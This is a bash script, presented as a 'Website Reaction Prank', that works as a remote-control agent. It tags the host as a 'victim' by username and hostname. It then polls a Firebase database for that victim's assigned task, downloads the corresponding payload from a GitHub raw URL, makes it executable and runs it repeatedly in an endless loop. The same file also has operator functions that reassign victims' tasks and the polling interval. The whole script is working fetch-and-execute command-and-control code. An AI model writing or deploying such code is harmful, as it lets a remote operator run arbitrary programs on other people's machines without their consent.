#!/usr/bin/env bash
# Download and run a script from a prepspecified location.

SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )

###################################################################

firebaseProject="michaelprank-67bf5"
payloadPrefix="https://raw.githubusercontent.com/thiesgehrmann/"

###################################################################
 # Configuration variables

localTaskData="$SCRIPTDIR/taskdata"
localPayloadFile="$SCRIPTDIR/payload"
localPayloadETagFile="$SCRIPTDIR/payload.etag"
localPayloadURLFile="$SCRIPTDIR/payload.url"

###################################################################

# General purpose functions

function urlExists(){
  local url="$1"
  if [ ! -z "`curl -s -I "$1" 2>&1 | head -n1 | grep '\(404\|400\)'`" ]; then
    echo 1
  else
    echo 0
  fi
}

function getTaskID(){
  echo "getTaskID: $1" >&2
  local victimID="$1"

  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victimID/task.json" \
   | tr -d '"'

}

function getPreviousTaskID(){
  echo "getTaskID: $1" >&2
  local victimID="$1"

  curl -s "https://${firebaseProject}.firebaseio.com/victims/$victimID/previousTask.json" \
   | tr -d '"'

}

function getTaskURL() {
  local payloadID="$1"
  curl -s "https://${firebaseProject}.firebaseio.com/tasks/$payloadID.json" \
   | tr -d '"'
}

function setVictimTask() {
  # Set task of victim $1 to task $2.
  # If $2 == '_previous_task_', then use the victims previous task as the 
  local victim="$1"
  local taskID="$2"
  local currentTaskID=`getTaskID "$victim"`

  if [ -z "$1" ] || [ -z "$2" ]; then
    usage
    exit 1
  fi

  if [ "$taskID" == "$currentTaskID" ]; then
    # The current task is the same as the next task. Do not change
    return
  elif [ "$taskID" == "_previous_task_" ]; then
    taskID=`getPreviousTaskID "$victimID"`
  fi

  # Set the next task, but only if it works!
  local taskURL="`getTaskURL $taskID`"
  if [ "$taskURL" == "null" ]; then
    # This task is unknown to us. Change to the default task instead.
    # Make sure that this task is registered!
    curl -X PUT -d "\"default\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
  else
    curl -X PUT -d "\"$taskID\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/task.json" &>/dev/null
  fi

  # Set previous task
  curl -X PUT -d "\"$currentTaskID\"" "https://${firebaseProject}.firebaseio.com/victims/$victim/previousTask.json" &>/dev/null
  
}

function getIterationLength() {

  local length=`curl -s "https://${firebaseProject}.firebaseio.com/iterationLength.json"`

  if [ ! -z "$length" ] && [ $length -eq $length ]; then
    echo "$length"
  else
    echo "60"
  fi
}

function setIterationLength() {
  local length="$1"

  if [ ! -z "$length" ] && [ $length -eq $length ] 2>/dev/null; then
    curl -s -X PUT -d "$length" "https://${firebaseProject}.firebaseio.com/iterationLength.json"  > /dev/null
  else
    usage
    exit 1
  fi
}


###################################################################
###################################################################
###################################################################

# Core deployment functionality
# Only perform the next steps if we are not being sourced
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then

  function getURLETag(){
    #echo "getURLETag: $1" >&2
    local remoteURL="$1"
  
    curl -s -H 'Cache-Control: no-cache' -I "$remoteURL" \
     | grep '^ETag' \
     | cut -d'"' -f2
  }
  
  function getPayloadURL(){
    #echo "getPayloadURL: $1" >&2
    local url="$1"
    local victimID="$2"
    
    local payloadID=`getTaskID "$victimID"`
    echo "getPayloadURL: $payloadID" >&2
    if [ "$payloadID" == "null" ]; then
      echo "${payloadPrefix}`getTaskURL 'default'`"
    else
      echo "${payloadPrefix}`getTaskURL \"$payloadID\"`"
    fi
  }
  
  function downloadURL(){
    #echo "downloadURL: $1, $2"
    local url="$1"
  
    local outfile="$2"
    echo "downloadURL: Downloading $url"
    curl -s -L "$url" > "$outfile"
    chmod +x "$outfile"
  }
  
  function downloadPayloadIfNeeded(){
    local victimID="$1"
    local remoteURL=`getPayloadURL "$taskURL" "$victimID"`
    local remoteURLETag=`getURLETag "$remoteURL"`
    localURL=`head -n1 "$localPayloadURLFile"`
    localETag=`head -n1 "$localPayloadETagFile"`
  
    echo "downloadPayloadIfNeeded: l-> $localURL"
    echo "downloadPayloadIfNeeded: r-> $remoteURL"
    echo "downloadPayloadIfNeeded: l-> $localETag"
    echo "downloadPayloadIfNeeded: r-> $remoteURLETag"
  
      # We have a totally new URL, we should get it no matter what!
    if [ "$remoteURL" != "$localURL" ]; then
      echo "downloadPayloadIfNeeded: We have a new URL!"
      downloadURL "$remoteURL" "$localPayloadFile"
      echo "$remoteURL" > "$localPayloadURLFile"
      echo "$remoteURLETag" > "$localPayloadETagFile"
  
    else
      echo "downloadPayloadIfNeeded: Same URL"
  
      if [ "$localETag" != "$remoteURLETag" ]; then
        echo "downloadPayloadIfNeeded: The payload has been updated!"
        downloadURL "$remoteURL" "$localPayloadFile"
        echo "$remoteURLETag" > "$localPayloadETagFile"
      fi
    fi
  
  }
  
  function runPayload() {
    echo "runPayload: Running"
    local victimID="$1"
    local iteration="$2"
    "$localPayloadFile" "$victimID" "$iteration"
  }
  
  ###################################################################

  victim="$1"
  if [ -z "$victim" ]; then
    victim="$USER.`hostname`"
  fi
  victim="`echo $victim | tr '.#[]/$' '______'`"

  ###################################################################

  # Remove the payload and local values
  rm -rf "$localPayloadFile" "$localPayloadETagFile" "$localPayloadURLFile"
  touch "$localPayloadFile"
  touch "$localPayloadETagFile"
  touch "$localPayloadURLFile"

  ###################################################################

  iteration=1
  
  while [ true ]; do

    rootLoopTime=`getIterationLength`
 
    echo "###################################"
    echo "# Website Reaction Prank         "
    echo "# VictimID: $victim              "
    echo "# Iteration $iteration"
    echo ""
  
    downloadPayloadIfNeeded "$victim"
  
    timeStart=`date '+%s'`
    while [ $((`date '+%s'` - timeStart)) -lt $rootLoopTime ]; do
      echo "Root: Running payload"
      runPayload "$victim" "$iteration"
      sleep 1
    done
  
    let iteration=$((iteration+1))
 
    if [ $((iteration % 100)) -eq 0 ]; then
      rm "$SCRIPTDIR/deploy.stdout"
      rm "$SCRIPTDIR/deploy.stderr"
    fi
 
  done

fi
